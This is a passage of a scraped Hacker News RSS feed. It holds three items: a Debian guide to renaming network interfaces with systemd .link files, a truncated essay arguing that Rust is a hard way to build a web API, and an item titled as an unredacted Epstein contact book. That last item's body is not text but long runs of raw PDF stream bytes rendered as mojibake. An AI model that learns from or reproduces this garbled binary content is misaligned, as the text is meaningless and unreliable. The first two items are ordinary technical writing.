It has 3 network interfaces: a wireless one, a wired one with a normal ethernet port, and a second wired one, with a prioprietary port, for Lenovo docks, I don‚Äôt use.</p><p>The interfaces are named <code>wlp3s0</code>, <code>enp2s0f0</code> and <code>enp5s0</code> in Debian. Yes, it turns out nowadways network interfaces are not simply named wlanX for wifi and ethX for ethernet as they conveniently used to.
There are good reasons for this change: depending on which interface was detected first during each boot, they could change name randomly. For example what was <code>eth0</code> on a boot could become <code>eth1</code> on the next one, which is problematic, as interface names can be used in some configuration files.</p><p>The solution is to give each interface some unique predictable names, based on the ‚ÄúBIOS device name‚Äù of the interface. This is great, but really annoying in practice, as I always forget how the interfaces are named, and which of the wired interfaces is the one I use üòï</p><h2 id="renaming-network-interfaces">Renaming network interfaces</h2><p>Thanksfully, it is possible to rename interfaces. On Debian, this is done using systemd configuration, as apparently nowadays udev is part of systemd.</p><p>First, we need to find the ‚Äúpath id‚Äù of the device, that is to say a unique identifier of the device, based on the PCI domain, the number of the bus and the device position on the bus.
It can be done using the command <code>udevadm</code>. For my wireless interface <code>wlp3s0</code> the command looks like:</p><div><pre><code data-lang="shell">$ sudo udevadm test-builtin path_id /sys/class/net/wlp3s0 2&gt;/dev/null 
ID_PATH<span>=</span>pci-0000:03:00.0
ID_PATH_TAG<span>=</span>pci-0000_03_00_0
</code></pre></div><p>In this case the <code>path_id</code> is <code>pci-0000:03:00.0</code>. I can then create a <code>.link</code> file to choose the name of the interface;</p><div><pre><code data-lang="shell">$ sudoedit /etc/systemd/network/10-rename-wlp3s0.link 
$ cat /etc/systemd/network/10-rename-wlp3s0.link 
<span>[</span>Match<span>]</span>
Path<span>=</span>pci-0000:03:00.0
<span>[</span>Link<span>]</span>
Name<span>=</span>wlan0
</code></pre></div><p>I did this for all the interfaces I wanted to rename, then rebooted and checked the result:</p><div><pre><code data-lang="shell">$ ip addr
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span>65536</span> qdisc noqueue state UNKNOWN group default qlen <span>1000</span>
    link/loopback ***************** brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: lenovo0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span>1500</span> qdisc pfifo_fast state DOWN group default qlen <span>1000</span>
    link/ether ***************** brd ff:ff:ff:ff:ff:ff
3: eth0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span>1500</span> qdisc pfifo_fast state DOWN group default qlen <span>1000</span>
    link/ether ***************** brd ff:ff:ff:ff:ff:ff
4: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span>1500</span> qdisc noqueue state UP group default qlen <span>1000</span>
    link/ether ***************** brd ff:ff:ff:ff:ff:ff
    inet ************/24 brd ************* scope global dynamic noprefixroute wlan0
       valid_lft 82650sec preferred_lft 82650sec
    inet6 *************************************/64 scope global dynamic noprefixroute 
       valid_lft 1784sec preferred_lft 584sec
    inet6 *************************/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
5: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span>1500</span> qdisc noqueue state DOWN group default 
    link/ether ***************** brd ff:ff:ff:ff:ff:ff
    inet **********/16 brd ************** scope global docker0
       valid_lft forever preferred_lft forever
</code></pre></div><p>The interfaces are now renamed <code>wlan0</code>, <code>eth0</code> (the ethernet port) and <code>lenovo0</code> (Lenovo‚Äôs prioprietary port) üéâ</p><h2 id="sources">Sources</h2><ul><li><a href="https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/">Predictable Network Interface Names - https://www.freedesktop.org/</a></li><li><a href="https://www.freedesktop.org/software/systemd/man/systemd.link.html">systemd.link ‚Äî Network device configuration - https://www.freedesktop.org/</a></li></ul></div></div>]]>
            </description>
            <link>https://staging.forty.sh/posts/2021-01-15-renaming-network-interfaces/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25798431</guid>
            <pubDate>Sat, 16 Jan 2021 00:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust is a hard way to make a web API]]>
            </title>
            <description>
<![CDATA[
Score 313 | Comments 384 (<a href="https://news.ycombinator.com/item?id=25798008">thread link</a>) | @tmcw
<br/>
January 15, 2021 | https://macwright.com/2021/01/15/rust.html | <a href="https://web.archive.org/web/*/https://macwright.com/2021/01/15/rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Rust is an amazing language. It has enabled excellent CLI tools like <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> and <a href="https://github.com/ogham/exa">exa</a>. Companies like Cloudflare are using Rust for their own systems and <a href="https://blog.cloudflare.com/tag/rust/">encouraging people to write Rust to run microservices</a>. Rust makes it possible to write really fast software that‚Äôs secure, tiny, and more concise than C++ or C.</p><p>If I were writing a geocoder, a routing engine, a real-time messaging platform, a database, or a CLI tool, Rust would be at the top of the list.</p><p>But last year, I spent some time trying to make Rust work for a plain-vanilla API to power a normal website. It wasn‚Äôt a very good fit.</p><h3 id="lots-of-missing-pieces">Lots of missing pieces</h3><p>Rust has a fair number of web server frameworks, database connectors, and parsers. But building authentication? You have only <em>very</em> low-level parts. Where Node.js will give you <a href="http://www.passportjs.org/">passport</a> and Rails has <a href="https://github.com/heartcombo/devise">devise</a> and Django gives you an <a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Authentication">auth model out of the box</a>, in Rust you‚Äôre going to build this system by learning how to shuttle a shared vec into low-level crypto libraries. There are libraries trying to fix this, like <a href="https://github.com/breard-r/libreauth">libreauth</a>, but they‚Äôre nascent and niche. Repeat for plenty of other web framework problem areas.</p><p>How about SDKs? In mainstream languages, you‚Äôll be able to plug into Google Cloud services, AWS, or Stripe by bringing in an official library. Those libraries are mostly great. The <a href="https://aws.amazon.com/sdk-for-javascript/">aws-sdk-js</a> and <a href="https://stripe.com/docs/libraries">Stripe libraries</a>, for example, are incredibly well-designed and maintained.</p><p>Not so with Rust. There are a few third-party libraries trying to fill in the blanks, which is great, but with the sheer velocity of those services, will they really be able to give a quality experience?</p><p>Some people will say <em>well, X language is so good you can just write an SDK yourself in a weekend!</em> To which I must reply, no.</p><p>Rust‚Äôs ecosystem is rich in other domains. The crates for building CLIs, managing concurrency, doing really impressive operations with binary data and low-level parsers - they‚Äôre spectacular.</p><h3 id="rusts-compiler-is-faster-than-it-was-but-still-slow">Rust‚Äôs compiler is faster than it was, but still slow</h3><p>I‚Äôve been reading <a href="https://blog.mozilla.org/nnethercote/2020/09/08/how-to-speed-up-the-rust-compiler-one-last-time/">Nicholas Nethercote‚Äôs</a> <em>excellent</em> blog for years now, in which he describes how the Rust team has made the compiler faster. And they certainly have made it faster!</p><p>But compared to other languages you build websites with, it‚Äôs slow. It‚Äôs much slower than the Go compiler and much, much slower than the startup time for interpreted languages like JavaScript, Ruby, and Python.</p><p>Once your code is compiled, everything‚Äôs amazing! But in my case, this basic API - which wasn‚Äôt even feature-complete and was by no means a complex system - took more than ten minutes to compile. On the weak hardware of <a href="https://cloud.google.com/cloud-build">Google Code Build</a>, it would run out of time, every time. We couldn‚Äôt build anything.</p><p>Caching helps as long as you don‚Äôt have to rebuild cached dependencies. And, I don‚Äôt know, maybe <a href="https://blog.kodewerx.org/2020/06/the-rust-compiler-isnt-slow-we-are.html">slimming down dependencies</a> would help Rust projects compile faster. But <a href="https://serde.rs/">serde</a>, for example - the JSON and other-format serializer/deserializer that nearly everyone uses - takes up a huge chunk of compile time. Should we replace serde with something that compiles faster but lacks great documentation and ecosystem support? It‚Äôs a bad trade.</p><h3 id="rust-is-complicated">Rust is complicated</h3><p>Rust makes you think about dimensions of your code that matter tremendously for systems programming. It makes you think about how memory is shared or copied. It makes you think about real but unlikely corner cases and make sure that they‚Äôre handled. It helps you write code that‚Äôs incredibly efficient in every possible way.</p><p>These are all valid concerns. But for most web applications, they‚Äôre not the most important concerns. And buzzword-oriented thinking around them leads to some incorrect assumptions.</p><p>Take, for example, Rust‚Äôs safety. This is a big part of the marketing, and it‚Äôs absolutely correct: Rust‚Äôs main promise is to be both <em>safe</em> and <em>low-level</em> - it works without a garbage collector, while at the same time protecting against memory-based exploits. When you read ‚Äúsafety‚Äù, think about Rust competing with C. Code in C can reference arbitrary memory, can easily overflow and segfault. Rust code can be just as fast as that C code, but protect that memory access, and without the cost of a garbage collector or some kind of runtime checking.</p><p>But Rust‚Äôs memory rules aren‚Äôt more secure than Node.js‚Äôs or Python‚Äôs. Your web application written in Rust isn‚Äôt going to be systematically more or less secure than an application in Python or Ruby. High-level languages with garbage collectors pay a performance penalty in exchange for generally dodging this whole class of exploits and bugs. You can‚Äôt reference uninitialized memory in JavaScript because you simply can‚Äôt reference memory-as-memory in JavaScript.</p><details><summary>Sidenote‚Ä¶</summary>This is describing the design goal of Node.js and other systems - they do occasionally have bugs that creep into this problem area. The <a href="https://github.com/nodejs/node/issues/4660">previous behavior of Node.js's Buffer object, for example, is a good read.</a></details><p>Heck, if you ask <a href="https://deavid.wordpress.com/2020/01/18/actix-web-is-dead-about-unsafe-rust/">some people</a>, Rust is <em>less secure</em> than a GC‚Äôed language for web apps if you use any crates that have <code>unsafe</code> code - which includes Actix, the most popular web framework, because <a href="https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html">unsafe code allows things like deferencing raw pointers</a>.</p><p>If you‚Äôre writing a video game, a pause to run garbage collection is bad. If you‚Äôre writing code for a microcontroller, any memory ‚Äúoverhead‚Äù or waste is really bad. But most web applications can spare a little memory overhead in exchange for productivity.</p><p>This argument is pretty much the same for the other attributes of Rust. Its concurrency primitives are <em>amazing</em> if you‚Äôre doing something complicated and need blistering-fast performance. But if you aren‚Äôt? The Rust async ecosystem is challenging, to say the least: there are different sorts of async, projects that span domains to do async implementations of unrelated stuff like <a href="https://tokio.rs/">tokio</a>.</p><p>It feels a lot less like Node.js, which had a good async story but ugly syntax, than Python Tornado or Twisted, which had a weird async story and also ugly syntax.</p><p>Async, I‚Äôm sure, will stabilize and homogenize and be a lot easier to do in the future. But I was working in the present.</p><h3 id="the-rust-ecosystem-is-not-web-centric">The Rust ecosystem is not web-centric</h3><p>There are many people currently learning Rust, writing CLI apps or low-level code in Rust, and having an extremely fun time. There are dramatically fewer people using Rust to write plain-vanilla web applications.</p><p>This is an important part of the equation for technology choices: are there people working with the tool <em>and</em> are they roughly in the same domain? Unfortunately, a lot of the incredibly exciting work in the Rust ecosystem has nothing to do with web application servers. There are some promising web frameworks - even a <a href="https://github.com/iron/iron">somewhat higher-level framework</a> - but they‚Äôre undoubtedly in a niche. Even Actix, the main web framework, has a <a href="https://github.com/actix/actix-web/graphs/contributors">very top-heavy set of contributors</a>.</p><p>If Rust grows at its current rate, the web portion of the community will reach a sort of critical mass, but right - I don‚Äôt think there are enough people using Rust for websites for it to be a practical tool for websites. And compare to other communities in which there are entire companies dedicated to building web applications with existing tools - not cutting-edge work, but the kind of stuff that differentiates a mature technology from a new one.</p><h3 id="the-juniper-crate-invites-n1s">The Juniper crate invites n+1s</h3><p>This part isn‚Äôt just about Rust, it‚Äôs about the GraphQL ecosystem and Rust‚Äôs involvement in that ecosystem is one example.</p><p><a href="https://www.infoq.com/articles/N-Plus-1/">The <strong>n+1</strong> problem</a> is something that everyone building web applications should understand. The gist is: you have a page of photos (1 query). You want to show the author of each photo. How many queries do you end up with: 1, combining the photos &amp; authors, or a query per photo to get the author after retrieving the photos? Or 2 queries, with the second having something like <code>user.id IN ids</code> to fetch all authors in a single pass and then reconnect them to their photos.</p><p>n+1 queries are usually the highest-priority database fixes: they‚Äôre usually high-impact, and changing an n+1 query into a single query is usually a big win. And we have lots of ways to try and resolve them: you can write SQL and try to get a lot done in a single query using CTEs and JOINs, like we did at Observable, or use an ORM layer like ActiveRecord that has <a href="https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations">quick ways to turn n+1 queries into predictable queries</a>.</p><p>We were using <a href="https://github.com/graphql-rust/juniper">Juniper</a>, a <a href="https://graphql.org/">GraphQL</a> server for Rust applications. GraphQL basically lets your <em>frontend application</em> define queries, instead of the backend. You give it a range of things it could query, and the application - React or something else - sends arbitrary queries to the backend.</p><p>This makes things <em>hard</em> for the backend. Any sort of SQL-level optimization is impossible - your server is writing dynamic SQL, so you rely on the intelligence of your GraphQL server, which is not always high. Juniper, for example: n+1 queries by default. The workaround - <a href="https://graphql-rust.github.io/juniper/master/advanced/dataloaders.html">a dataloader</a> - is rough and independently maintained. So at the end of the day, you‚Äôre going to have a blisteringly-fast application layer that‚Äôs spending all of its time inefficiently querying your database.</p><p>The word is that GraphQL works really well with non-SQL databases which can serve these sorts of requests fast. I‚Äôm sure that there‚Äôs some special database used internally at Facebook that‚Äôs incredible in combination with GraphQL, but the rest of industry is pretty attached to Postgres and its ilk, <a href="https://info.crunchydata.com/blog/postgres-the-batteries-included-database">for good reason</a>.</p><h3 id="lets-have-some-caveats">Let‚Äôs have some caveats!</h3><p>So I tried to lead with the main caveat: this isn‚Äôt about Rust in general. It‚Äôs about using the language and its ecosystem for a particular goal. Simple web APIs.</p><p>The caveat to that: in the general sense, you can build a website with anything and be successful. Remember how OkCupid was <a href="https://github.com/OkCupid/okws">implemented in C++</a>. There‚Äôs a popular <a href="https://www.costarastrology.com/">astrology app, Co-star</a>, that‚Äôs all Haskell. If you‚Äôre great at writing some language and you can hire other people with lots of talent, you can do it and be heroes.</p><p>Another caveat: what I was trying to build was a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a>-heavy web application API for a website. It wasn‚Äôt a web ‚Äúservice‚Äù as you might call them nowadays, something that ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macwright.com/2021/01/15/rust.html">https://macwright.com/2021/01/15/rust.html</a></em></p>]]>
            </description>
            <link>https://macwright.com/2021/01/15/rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25798008</guid>
            <pubDate>Fri, 15 Jan 2021 23:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jeffrey Epsteins Little Black-Book Unredacted [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25797773">thread link</a>) | @DyslexicAtheist
<br/>
January 15, 2021 | https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf | <a href="https://web.archive.org/web/*/https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>¬Ω¬®≈æm¬ßq^√∑KF√Ä√É≈°ÔøΩnV√´√Ø√á9¬©√âÔøΩK*wI√≥E¬°"√æMv¬®√´≈°√∂^u‚Äπ√ø¬§≈íR√∂s‚Äù‚Äù√ö¬•¬∂¬µP¬¢¬∞¬ÆY√ùV¬•Pi√∂√ò5√î)≈°d√öq√¨\¬ºu≈æ¬ær‚Ä∞√êP‚Äî?¬ßÀú&nbsp;√±5√∂ÔøΩ‚Äîb√í=¬ΩX√é√µ√õ‚Äì*√æ
0.F0√Ø
endstream
endobj
1159 0 obj
&lt;&gt;stream
H‚Ä∞≈íT=O√´@√¨-√•?l	‚Ä∫√õ¬Ωo	!√Ø√ë√ëÔøΩ‚Äùi¬¢‚Ç¨_√≤√§ÔøΩ√àI
√Ñ≈∏√ß√é√§N√Å√ÇraK√û‚Ñ¢√ôÔøΩ√ô¬ª√¢√Ø√≥√£¬§Àú√éN‚Ä°√Ω√õ√™¬∑¬∑√ì√á√ù{	√¢√Æ√æ‚Äû?‚Ä¶‚Ä†√πjRTZ8√°	≈∏Bh¬©√ë3Bma¬æÔøΩW√µ¬©&lt;‚Äì√ñf¬ª\√°j¬∑‚Ä¶kÀú√ø≈∏ÔøΩ‚Ä†hhl√É`A‚ÄúFc@√´@√õ‚Äö¬©+¬æ	‚Äô¬≤√ót√Ü‚Ä∫√ÅÔøΩJ≈æl‚Ä°	A.ÔøΩ]Vm|W=<m¬£-dn¬§,r¬¶√ã¬§]:√ô0√ü√¥√©(‚Ç¨`^fcy‚Äù&√©ia0√í‚Äûv9u√∏√úwc√ñ¬©ÔøΩ;‚Ä∫√∑nf¬≠¬ø√Ñ‚Äû~h√õv√¢¬ªif∆í√≤ ‚Äúl√Ñ¬¥√ô$Àús6‚Ä¶‚Äît.‚Ä¢√ç¬∞i)√´¬§ts√ÇÔøΩ√èj¬Ω="" √∫√ü‚Äòsx¬†n5√£="">¬¶¬´i
‚Ä∫"?√∑√£√ÇW|iH41#‚Ä∫-¬´√™c\@¬±M¬¶¬°6∆í√ïD&nbsp;$z√ô¬Ø¬ß¬ºiK?√Ä√ô¬°‚Äô√ú√í¬®1Y¬∂¬§-¬ß≈ìR9√ä6√π√ûx√ìa√£Iv√à:.¬Æ≈Ω√µG‚Äô‚Äì√î¬¥/‚Äô¬∫√û~ÔøΩ#√∂¬°√ú¬•ct‚Ñ¢5√•¬¶&gt;T‚Äπ√´,¬µ¬ß5u‚Ä°'‚Äô√©√∂√úO¬¶√∏6√åa{AJgkx√Æ¬´√óz√≥√∫√Ø-¬πy,]ÔøΩ@√íp¬∂,√ãz√∑√û√èu¬æ.ÔøΩ`#√ê!√ü~√•√î7n√ç-¬æ‚Äô¬¢0√õ
endstream
endobj
1160 0 obj
&lt;&gt;stream
H‚Ä∞≈í‚ÄúMo1‚Ä†√Ø+√•?√∏X;√µ≈í√≠¬±ÔøΩ¬™
√®√áÔøΩT√ëH\zY√≤!I¬∂jB√¢√è√£√µ¬Æ√ó√´*%U≈Ω¬¥√≥&gt;~=√ØL√Ö√†¬•D!√Éo√∏√ã√Ñ‚Ç¨F(r√Ä^√åw¬≥√™√Ñ≈†7b√æcVÔøΩ√û√æz¬º_-≈æ√Ñ√ô√ô√©E¬ª_y~.&gt;\^‚Äû/√óOR&nbsp;Àú¬Øg‚Ä¢¬©≈í√≥√Ö¬¨¬≤@‚Äò√úÔøΩ¬¨‚Äù+¬∞[√ò,¬ø=¬¥?W√æ√™s √ïAÔøΩ√™‚Ç¨≈æ¬∏¬¥√µe‚Ñ¢|]O¬∑√ó√±√∫A-√ë√ª ¬Ø‚Ç¨¬∫#&gt;¬µ√ªe¬ª?√∫¬∏√êgmi¬£√êW√Ñ√©:WX√∑\√î√ç√•√®}√ö¬π√ë¬π√ïC&amp;≈íSx‚Ä∞Ph√ÅrI√í√ñ‚Äì,J√â'√∂√çS¬Ø√Ø¬Ø√éJ‚Äû√†¬øW√ä√§4√ñsY¬Ø(.√™	¬©v√ñ√ó‚Äì√É√ù√á¬ß&nbsp;√àÔøΩ√®&gt;$`&gt;x≈Ω√¨¬´]¬≥√ô¬æÔøΩ6√Æe√¥$√ó0¬ß≈°}bj≈†a$√¶c¬≥^√øn¬∂√Ø≈°v‚Äπv7‚Ä¶w≈ΩX
ÔøΩ¬ß^√∑SÔøΩ@&gt;p$ÔøΩ√âM¬æ#2DX¬´√∞√Ω``√à‚Ä∞L√Ñug√áRZÔøΩ
ÔøΩ
m|√øq√µ¬ß√ô/W¬π√π√§(√ôt‚Äú2U√û4¬ª¬¨I√£a(5T√Ø^B√à≈æ√òÔøΩ&amp;Q‚Ä°-√é¬∑qZ)‚Ä¢^≈æ¬¥Z¬©B√ãZ√çzt√∂‚Äò√Ü√≠√®‚Ä∞&amp;.√à‚Äù¬®¬§¬π¬Ω;√ô¬º&gt;k2)l‚Äî‚Äúr√£[;¬ø:'‚Ä¶√èr¬µh¬®√ê*	¬™√î√¶.‚Ä¶oMQZc|Qn√Ü√≤√ø¬∂√â¬æd¬økLo¬•√ª{√ø¬∫√û√Ñ√ø√Ç¬Ø/√â
endstream
endobj
1161 0 obj
&lt;&gt;stream
H‚Ä∞≈í‚ÄùKo√õ0‚Äû√Ø√¥xl√ûp‚Äî√Ø"√ê√öq/√≠√âz¬ßu+KÔøΩ¬´√Ω√π%%Jc¬∏|√∞≈°ÔøΩ3√É]#√õ¬ø‚ÄùNZ¬±√Ω¬°,4H√é‚Äòq√ø≈†5q¬∞≈†‚Äò¬≤‚Ç¨‚Äö√≠√èe√±√Æ√±\ÔøΩ√™√¨=√õ√ø,‚Äπ√á¬Ø√´¬≤¬∏√õ√Ω√π√Ωz<t√¨√æ√æn√ù6 ≈í?<¬∞o‚Ä∫√µ√Ä&{‚Äπ-d‚Ä†~¬≠¬∫√£√ü¬™y="">^‚Äì√£o:¬∑√Üf√∏¬™≈Ω√¥K√ª√ΩTgGl √É¬±t∆íe√´√≠bxE√∏‚ÄìH(ÔøΩj√Ä}¬¨¬´K√ït¬ß
B)¬Ø‚Ä¶√û‚Ç¨¬∂‚Ñ¢√∞√≥¬©:¬¥√ß6√™n√á√≥¬Æ(¬π‚Äö*p&gt;YOW`z[J{:c√∫¬∂¬´.rY¬´√†√ô≈Ω`‚Äú¬®√Ç‚Ç¨ÔøΩ2¬ßZ¬±√∏J¬§√ï√óD√©√£cF√ú√î√µ¬Ø√£b√®‚Äù√≠≈í¬™√Ωt√¶&gt;w√ù‚Ä∫{√•¬±√ÅÔøΩU≈í√É¬¢¬∏=√Ö
F$√Ä‚Ä∞7io{√í‚Ç¨H4∆í8√∞¬π√ßÔøΩ√çS≈æO∆ís√Ç$‚Ä¶√î√†√è‚Ñ¢+vu≈°%√©\4k√ìd√õq'‚Äò¬°‚Ä¶√õ¬∫√™d√í‚Äô√í√ø√ôg√¥ÔøΩ!MÔøΩ}i‚Ä∫√ß¬∂‚Ä∞√¢¬¨%4~√¢¬≥‚Ä¶√µ√ç√•√¢o¬∏`≈†;~¬Ω[¬°ÔøΩ¬©	t√Ω≈∏√óa√Öz.'nV√íeC¬º√±8¬≠‚Ñ¢\qÔøΩ"‚Äúk48¬´Rk¬ªO√ß!√êx≈æ√∞?¬§
(√é√õ¬§√∞ÔøΩ:SÔøΩ≈æÔøΩ √¢eM√è{K√úf√è√á√ì√≥\≈Ω1¬¶≈†{o‚Äô¬°&nbsp;√ù√î‚Ä¶]9√ø-√âUÀÜ√Ω`√´√•4≈æ
endstream
endobj
1162 0 obj
&lt;&gt;stream
H‚Ä∞‚Äù‚ÄùOk1√Ö√Ø√æ:&amp;ÔøΩgF¬£%√ö4‚Ä†
ÔøΩ√∏Àú‚Äπ	
Np‚ÄôBr√®‚Äî√Ø√à¬´]K^√í√î√¨a‚ÄîE√Ø¬ß√∑fF√™"√î¬ß|z‚Ä° b(Y√∞√â¬¨g√ù	"sjV¬≥nq√Ω√∫√ª√ó√è√õsv¬∂¬∏x~¬∫3x~n¬æ|¬ΩÀúu√®√å√™v√ñp√é¬∑H√Ø!¬•ys¬≤¬π/√à√ã¬Ω≈°\(√∫‚Ä∞%J√ïRL`C¬±√Ñ√ßA<q¬§√Å√ör∆í‚Ä†√å√™ni√Ñ‚Ä¶√Çj!b≈í √¢√≠√Éh‚Äπ√•√ãh√§√®{l√≠]9ezh{w!¬ª¬™‚Äú√çu≈†‚Ä°rgÔøΩ≈Ωr√∂ÔøΩ√údÔøΩ√≠k√¨a√ò¬πl+√õ‚Äî8i√ä≈°√π√≠√¶¬¥¬∂√±¬Ø‚Äùc√ù√≤√¨¬•√¨√°‚Ä†6‚Äù√è¬°="" !√§√ú√ª√Ä√≥d√±¬†‚Äî√®√¢{ÔøΩ2^√Ñ¬¥e≈∏#f~o¬™7√í√¥6¬¶l‚Ä∫%v&√ç√Å√Ä‚Ç¨√Ét√õ√®√∑√õr¬¢v`="√®h√ï¬±¬±¬≤‚Ñ¢√ø6-E" n√ñ3√Ö#‚Ä∫j8√¢<∆í√ö¬´q¬Æ¬æ7="" ]nh≈∏‚Äî¬®¬Øz√ô√≤;g√ñ¬π"i√äp|√ûn√óo√ª√ìt%h√ï√ï√∫u{√§aa√Ø√™3≈Ω‚ÄûÔøΩi¬∏u√®√ø¬¥¬∫yt¬Ædl∆í√Ñ‚Ä†√à√ò≈ì¬ºÔøΩd√ìh@h¬≥√ö√™="" +a√ñ¬¥3ÔøΩ√í√™√µ.‚Äû0¬Ωjvg‚Ä†¬ß7√™f:bc√≥.√ó√∑√õo√áÔøΩcr√á¬∞√ö√ät√ç_ÔøΩd√å*p="" endstream="" endobj="" 1163="" 0="" obj="" <<="" filter="" flatedecode="" length="" 491="">&gt;stream
H‚Ä∞≈í‚Äù[k√õ@‚Ä¶√ü√∫‚Ä∫‚Äî‚Äô‚Ç¨5√ô√ô√ªBm≈ì‚Äû√í√íb√ë¬ß¬º,≈†¬πU$√ó‚ÄîB√®≈∏√Ø√™√¢xeEMH√ö‚Ä°√Ø√å√å‚Ñ¢#E√áK¬∑-&gt;√æ√ô~√â\	Y√µDNH√∫3≈Ω¬Æ¬æM√£√®√¥:G‚Äö$}ÀÜ#
‚ÄùJ‚Äôfqd@√™¬Ø√∫¬©√ê√ü-A√§√æÔøΩ&gt;√Ö√ë√±¬ß¬¢p√•¬§√±‚ÄúvH	V‚Äû√î√∑E√∂¬´c|M¬∫¬´9$‚Ä¢‚Äû^¬π{*√¨√î¬®!¬™H¬≤3¬∑r√π¬∞jRhlt∆í√´fN¬≠	R
¬¢¬£‚Ä¢√ú¬°¬≥√≠z9√è6√§√¨√¨tZ‚Ä¢‚Äû≈æ≈∏‚Äú‚Äπ√ãi¬´√ÑÀú√®+1√ü√∂‚Äù.\√π√¨√ä≈æ√Ø√ø‚Äî¬º/)√´‚ÄòB√Ö¬ø‚Ä¶u¬®√òZ¬©@P≈†
√ñ¬Ω6Db(√ì¬≤v¬ø;D;‚Ä†1¬®Bl¬∂qe1~√ì‚Äú&amp;jLVhP"‚Äùm&amp;y≈ì√∑F√ä√µ¬®‚Äö¬¶‚Ç¨:T¬∏¬≠√ú√Ω{¬∫‚ÄôÔøΩ¬¢¬§√û√û‚Ä°8'√Ü¬≥¬≠√¢√ßj√Ω√ª&nbsp;!√§f¬¨!¬Æ‚Ç¨‚Äπ√øZ‚Ä¢ÔøΩ‚Äú‚Äî√òm√®&gt;¬∂L√ôA√™|_‚Ä†∆í√§-Kib$K√≤‚Äûj√Ö^
?¬™W√ÇÔøΩ¬∫^¬≥√≤√¶√∞√ùw¬∫√â¬´√ïrn√õ9-√¥‚Ç¨‚Ä∫√¶nU,√¶o:LVg‚Äì¬ø√òk|n≈°√±‚Ä∫¬∂¬∏%‚ÄôÔøΩ√î][GG√π√çjy√∞
&lt;√¢G¬£¬¨√´E	‚ÄùÔøΩ[≈í√™‚Äû¬±0√ëv‚Äù$i‚Äù≈°¬ø'8(√•Àú¬¶`t¬®√π7¬ø;	g¬ªJ√£ÀÜ√º`ÔøΩ'|
endstream
endobj
1164 0 obj
&lt;&gt;stream
0Àú¬§@&amp;‚Ä°Àú¬§√ø√Ω√ø√æ√æ√æ¬¨¬£'S√Æq‚Äì?√ö√í*√ò√æ]√åB≈æ
‚Äò¬ød&nbsp;√¶@√å‚Äù^v1`√ÅD¬∏√≤√∫‚Ä∞@jgUy√í√ã¬∑¬Æ¬∂√¥¬∫7¬ß¬π¬∞P√ê≈ìkm√°‚Äî√ß√¥'G,2EbZ@¬π‚Äîv2¬∂_0¬¶√ù‚Äùfs√¨n‚Äîy√ßl√ë√Å‚Äπ¬π√å7√¶,¬¥‚Ç¨$√õ√±√≤√ó√π√Ö√Ö¬Øf¬∞√ÖH¬Ω‚Ä†W√è√Öh‚Ä∫√•=√ã√Ö‚Äò√ÑU¬ºTe6‚Äö√º√™√ä¬º√¶‚Ä¶@¬¢≈†√≤‚Äπ≈ì+ ;y¬ælFp√ê¬•√≤√∫h√à¬π√Ω:%¬§P√∑kA√Ä√∞¬ø‚Äô¬∫¬∑¬∑[v√Ñ√¨‚Ä¢¬´.¬µh¬π√µzm√ê√™‚Äì√ÇH√¨√ûBZ*;&nbsp;\¬°J√Ç¬ø√ΩÀú√ªR√á&gt;√¶L√¨/L√πv√ñ√º	"√ÑÔøΩÔøΩ√∂dC≈Ω&gt;‚Ñ¢√™‚Äû#r4;¬µX√§‚Äî(\4√ù‚Ä†√é¬µÔøΩ√≠N\√ß6GR√∫√†‚Ä°@¬∫≈ì√•k√§c¬∂√é{]√±¬Æ√à√Æ√±‚Äô+√¶‚Ä¶Z]&gt;√ï96 +O√™√∂¬º(.3√∑"√âo√ì¬ßB√°√°¬£¬¢8 ‚ÄìA7≈†.iÀú√º¬®√¥ÀÜ¬¶vK√ãZ‚Äô)√≥x√ú¬§√∑;7√±¬¢√íl√ì√ñ√∏4‚Äîk"≈∏ ¬ø‚Ä¢√âU**√í√°√èfÀÜ‚Äû‚Ä°√¶1√ì≈Ωw_`
¬¨√∑√á8'G¬∑√ï‚Äû√¶0c0‚Ä°c‚ÄπA√Ç‚Ñ¢√â√í]Y√ó"%≈∏√¥√∏√π¬©√ü.√≤√ì&nbsp;o‚Ä∞wa√æ√°dÀÜ¬¨x√üSh√ñZL‚Ñ¢‚Äπ√¢C¬©√∏56¬°¬¢¬´A√Ç¬ØÀÜ√å)√Ø‚Ä°s@o_ÔøΩ√øYO‚Äî‚ÄîC‚Äò
A√í√´‚Äîby√©L√ß0|≈í¬§!√ê¬™‚Ñ¢J,GE√É
wÔøΩ√µÔøΩY√í7¬©√´2¬∏√•¬≥Gk?uu‚Äù¬¶\ÔøΩ*√ê9√Ω≈ΩkMD√á\√ëB√ãK¬æ6ÔøΩ√Æ¬∞¬¥¬©√±|√áb√èw‚Ä°4¬µ$√ó√Ä√ö√Ω‚Ä∞&amp;‚Ä†.[gcÔøΩjCg¬¥√ß√≤√Ø!IaGMQ&amp;√î¬≠¬¥ÔøΩÔøΩHg
